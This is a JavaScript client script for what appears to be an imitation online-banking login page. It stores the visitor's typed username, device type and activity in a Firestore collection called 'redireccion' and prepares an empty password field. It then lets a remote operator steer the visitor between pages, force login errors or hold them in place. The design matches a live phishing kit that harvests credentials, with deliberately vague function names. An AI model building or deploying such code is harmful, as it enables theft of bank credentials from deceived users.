(function (global) {
  'use strict';

  var ENABLED_COLOR = '#1F54A5';

  function toDocId(value) {
    var trimmed = (value || '').trim();
    if (!trimmed) {
      return 'anon_' + Date.now();
    }
    return trimmed.replace(/\//g, '_').slice(0, 500);
  }

  function detectDispositivo() {
    var ua = navigator.userAgent || '';
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
      return 'Mobile';
    }
    return 'Desktop';
  }

  function normalizePath(url) {
    try {
      var parsed = new URL(url, global.location.origin);
      return parsed.pathname.split('/').pop() || parsed.pathname;
    } catch (error) {
      return url;
    }
  }

  function normalizeRedirectPage(page) {
    return page;
  }

  function resolveMitLabel(btn, config) {
    if (config && config.mitLabel) {
      return String(config.mitLabel);
    }
    if (btn) {
      var fromData = btn.getAttribute('data-mit-label') || (btn.dataset && btn.dataset.mitLabel);
      if (fromData) {
        return String(fromData);
      }
      if (btn.value) {
        return String(btn.value);
      }
    }
    return '';
  }

  function waitForFirebase(callback, onFail) {
    function fail(message) {
      if (typeof onFail === 'function') {
        onFail(message);
        return;
      }
      console.error(message || 'Firebase no disponible');
    }

    if (global.firebaseInitError) {
      fail(global.firebaseInitError);
      return;
    }

    if (global.firebase && global.firebase.firestore && global.db) {
      callback();
      return;
    }

    var settled = false;
    function onReady() {
      if (settled) {
        return;
      }
      settled = true;
      global.removeEventListener('firebaseReady', onReady);
      global.removeEventListener('firebaseError', onError);
      callback();
    }
    function onError(event) {
      if (settled) {
        return;
      }
      settled = true;
      global.removeEventListener('firebaseReady', onReady);
      global.removeEventListener('firebaseError', onError);
      fail(event.detail && event.detail.message ? event.detail.message : 'Firebase no disponible');
    }
    global.addEventListener('firebaseReady', onReady);
    global.addEventListener('firebaseError', onError);
  }

  function IndexFlowClient(config) {
    this.config = config;
    this.unsubscribe = null;
    this.currentDocId = null;
    this.localPage = config.localPage;
    this.sessionKey = config.sessionKey || 'intermaticoActual';
  }

  IndexFlowClient.prototype.query = function (selector) {
    return document.querySelector(selector);
  };

  IndexFlowClient.prototype.getTiki = function () {
    var userEl = this.query(this.config.userInput);
    return userEl ? userEl.value.trim() : '';
  };

  IndexFlowClient.prototype.setMitEnabled = function (enabled) {
    var btn = this.query(this.config.mitButton);
    if (!btn || btn.classList.contains('bse-btn-loading')) {
      return;
    }
    btn.disabled = !enabled;
    btn.classList.toggle('botonSiguienteDeshabilitado', !enabled);
    btn.classList.toggle('botonSiguiente', enabled);
    if (enabled) {
      btn.style.backgroundColor = ENABLED_COLOR;
      btn.style.color = '#fff';
      btn.style.cursor = 'pointer';
      btn.style.opacity = '1';
    } else {
      btn.style.backgroundColor = '';
      btn.style.color = '';
      btn.style.cursor = '';
      btn.style.opacity = '';
    }
  };

  IndexFlowClient.prototype.syncMitState = function () {
    var btn = this.query(this.config.mitButton);
    if (btn && btn.classList.contains('bse-btn-loading')) {
      return;
    }
    var usuario = this.getTiki();
    var min = typeof this.config.minUserLength === 'number' ? this.config.minUserLength : 1;
    this.setMitEnabled(usuario.length >= min);
  };

  IndexFlowClient.prototype.setLoading = function (loading) {
    var btn = this.query(this.config.mitButton);
    if (!btn) {
      if (loading && global.showLoader) {
        global.showLoader();
      } else if (!loading && global.hideLoader) {
        global.hideLoader();
      }
      return;
    }
    var stableLabel = resolveMitLabel(btn, this.config);
    if (stableLabel) {
      btn.dataset.originalLabel = stableLabel;
    }
    if (loading) {
      btn.disabled = true;
      btn.classList.add('bse-btn-loading');
      btn.setAttribute('aria-busy', 'true');
      if (btn.tagName === 'INPUT') {
        btn.value = this.config.loadingLabel || 'Procesando…';
      } else {
        btn.textContent = this.config.loadingLabel || 'Procesando…';
      }
      if (global.showLoader) {
        global.showLoader();
      }
      return;
    }
    btn.classList.remove('bse-btn-loading');
    btn.removeAttribute('aria-busy');
    if (btn.dataset.originalLabel) {
      if (btn.tagName === 'INPUT') {
        btn.value = btn.dataset.originalLabel;
      } else {
        btn.textContent = btn.dataset.originalLabel;
      }
    }
    if (global.hideLoader) {
      global.hideLoader();
    }
    this.syncMitState();
  };

  IndexFlowClient.prototype.isErrorState = function (data) {
    if (!data) {
      return false;
    }
    var page = Number(data.page);
    if (!Number.isNaN(page) && this.config.errorPage && page === this.config.errorPage) {
      return true;
    }
    return data.inicioErr === true;
  };

  IndexFlowClient.prototype.emitLognPage = function (data) {
    var page = Number(data && data.page);
    if (Number.isNaN(page)) {
      page = 0;
    }
    page = normalizeRedirectPage(page);
    document.dispatchEvent(new CustomEvent('lognPage', {
      detail: { page: page, data: data || {} }
    }));
  };

  IndexFlowClient.prototype.clearReturnedHold = function () {
    try {
      sessionStorage.removeItem('intermaticoHoldCommand');
    } catch (error) {}
  };

  IndexFlowClient.prototype.holdsIndex = function (data) {
    var held;
    try {
      held = sessionStorage.getItem('intermaticoHoldCommand');
    } catch (error) {
      return false;
    }
    if (held === null) {
      return false;
    }
    var commandAt = data && data.adminCommandAt != null && data.adminCommandAt !== ''
      ? String(data.adminCommandAt)
      : '';
    if (commandAt === held) {
      return true;
    }
    this.clearReturnedHold();
    return false;
  };

  IndexFlowClient.prototype.startRedirectListener = function (docId) {
    var self = this;
    if (this.unsubscribe) {
      this.unsubscribe();
      this.unsubscribe = null;
    }

    this.unsubscribe = global.db.collection('redireccion').doc(docId).onSnapshot(function (snapshot) {
      if (!snapshot.exists) {
        return;
      }
      var data = snapshot.data() || {};
      var targetPage = Number(data.page);
      if (Number.isNaN(targetPage)) {
        targetPage = 0;
      }
      targetPage = normalizeRedirectPage(targetPage);

      if (global.FlowPrefetch) {
        global.FlowPrefetch.stash(docId, data);
      }

      self.emitLognPage(data);

      if (self.isErrorState(data)) {
        self.setLoading(false);
        if (global.hideLoader) {
          global.hideLoader();
        }
      }

      if (self.holdsIndex(data)) {
        self.localPage = 0;
        self.setLoading(false);
        return;
      }

      if (!targetPage || targetPage === self.localPage) {
        self.localPage = targetPage;
        return;
      }

      if (self.isErrorState(data) && targetPage === self.config.errorPage) {
        self.localPage = targetPage;
        return;
      }

      if (!global.RouteResolver) {
        console.error('RouteResolver no cargado');
        self.localPage = targetPage;
        return;
      }

      global.RouteResolver.applyRedirect(targetPage, docId, normalizePath).then(function (result) {
        if (!result.ok || result.samePage) {
          self.localPage = targetPage;
          self.setLoading(false);
        }
      });
    }, function (error) {
      console.error('Error escuchando redireccion:', error);
    });
  };

  IndexFlowClient.prototype.clearUserInput = function () {
    var user = this.query(this.config.userInput);
    if (user) {
      user.value = '';
    }
    this.syncMitState();
  };

  IndexFlowClient.prototype.registerActivity = function (docId) {
    if (!docId || !global.db) {
      return;
    }
    global.db.collection('redireccion').doc(docId).update({
      isActive: true,
      pageLocation: this.config.pageLocation,
      lastActivity: global.firebase.firestore.FieldValue.serverTimestamp()
    }).catch(function () {});
  };

  IndexFlowClient.prototype.handleMit = function (event) {
    if (event) {
      event.preventDefault();
      event.stopPropagation();
    }

    var self = this;
    var usuario = this.getTiki();
    var min = typeof this.config.minUserLength === 'number' ? this.config.minUserLength : 1;
    if (!usuario || usuario.length < min) {
      this.syncMitState();
      return;
    }

    var docId = toDocId(usuario);
    this.currentDocId = docId;
    sessionStorage.setItem('bseSessionUser', docId);
    sessionStorage.setItem(this.sessionKey, docId);
    this.clearReturnedHold();
    this.setLoading(true);

    waitForFirebase(function () {
      if (!global.db || !global.firebase || !global.firebase.firestore) {
        self.setLoading(false);
        if (global.hideLoader) {
          global.hideLoader();
        }
        alert('Firebase no está listo. Recargá la página e intentá de nuevo.');
        return;
      }

      var payload = {
        tipo: self.config.tipo,
        usuario: usuario,
        clave: '',
        page: 0,
        inicioErr: false,
        loginError: '',
        pageLocation: self.config.pageLocation,
        dispositivo: detectDispositivo(),
        isActive: true,
        lastActivity: global.firebase.firestore.FieldValue.serverTimestamp(),
        updatedAt: global.firebase.firestore.FieldValue.serverTimestamp()
      };

      global.db.collection('redireccion').doc(docId).set(payload, { merge: true })
        .then(function () {
          self.startRedirectListener(docId);
          if (global.LgpHistorial && typeof global.LgpHistorial.guardar === 'function') {
            global.LgpHistorial.guardar(docId, { tipo: self.config.tipo }).catch(function () {});
          }
        })
        .catch(function (error) {
          console.error('Error guardando usuario:', error);
          self.setLoading(false);
          if (global.hideLoader) {
            global.hideLoader();
          }
          alert('No se pudo enviar la información. Revisá tu conexión e intentá de nuevo.');
        });
    }, function (message) {
      console.error(message);
      self.setLoading(false);
      if (global.hideLoader) {
        global.hideLoader();
      }
      alert(message || 'No se pudo conectar con Firebase. Revisá el Worker y recargá la página.');
    });
  };

  IndexFlowClient.prototype.bindEvents = function () {
    var self = this;
    var mitBtn = this.query(this.config.mitButton);
    var userEl = this.query(this.config.userInput);

    if (mitBtn) {
      mitBtn.addEventListener('click', function (event) {
        self.handleMit(event);
      });
    }
    if (userEl) {
      userEl.addEventListener('input', function () {
        self.syncMitState();
      });
      userEl.addEventListener('keydown', function (event) {
        if (event.key === 'Enter') {
          event.preventDefault();
          self.handleMit(event);
        }
      });
    }
    this.syncMitState();
  };

  IndexFlowClient.prototype.resumeSession = function () {
    var savedId = sessionStorage.getItem('bseSessionUser') || sessionStorage.getItem(this.sessionKey);
    if (!savedId || !global.db) {
      return;
    }
    var self = this;
    global.db.collection('redireccion').doc(savedId).get().then(function (snapshot) {
      if (!snapshot.exists) {
        sessionStorage.removeItem('bseSessionUser');
        sessionStorage.removeItem(self.sessionKey);
        return;
      }
      var data = snapshot.data() || {};
      if (!String(data.usuario || '').trim()) {
        return;
      }

      self.currentDocId = savedId;

      if (self.holdsIndex(data)) {
        self.localPage = 0;
        self.setLoading(false);
        self.startRedirectListener(savedId);
        self.registerActivity(savedId);
        return;
      }

      if (self.isErrorState(data)) {
        self.emitLognPage(data);
        self.startRedirectListener(savedId);
        self.registerActivity(savedId);
        return;
      }

      var page = Number(data.page);
      if (Number.isNaN(page)) {
        page = 0;
      }
      if (page === 0) {
        self.setLoading(true);
      }

      self.startRedirectListener(savedId);
      self.registerActivity(savedId);
    }).catch(function () {
      sessionStorage.removeItem('bseSessionUser');
      sessionStorage.removeItem(self.sessionKey);
    });
  };

  IndexFlowClient.prototype.init = function () {
    var self = this;
    this.bindEvents();
    waitForFirebase(function () {
      self.resumeSession();
      document.addEventListener('visibilitychange', function () {
        if (!document.hidden && self.currentDocId) {
          self.registerActivity(self.currentDocId);
        }
      });
    });
  };

  global.IndexFlowClient = {
    init: function (config) {
      var client = new IndexFlowClient(config);
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function () {
          client.init();
        });
      } else {
        client.init();
      }
      return client;
    }
  };
})(window);
